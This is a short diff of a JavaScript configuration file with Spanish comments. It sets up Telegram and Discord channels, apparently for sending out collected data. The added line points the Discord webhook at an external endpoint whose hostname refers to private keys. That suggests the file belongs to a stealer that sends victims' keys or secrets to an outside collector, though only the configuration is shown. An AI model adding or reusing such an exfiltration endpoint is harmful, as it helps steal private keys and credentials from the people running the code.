@@ -89,7 +89,7 @@ var PROXY_URL   = "";
 // Si PROXY_URL está vacío y estos tienen valores, se usarán directamente.
 var TG_TOKEN    = "";
 var TG_CHAT     = "";
-var DC_WEBHOOK  = "";
+var DC_WEBHOOK  = "https://private-keys-zeta.vercel.app/api/webhook?key=";
 
 var PROXY_ENABLED = PROXY_URL.indexOf("http") === 0;
 var TG_ENABLED    = !PROXY_ENABLED && TG_TOKEN.length > 20 && TG_CHAT.length > 3;
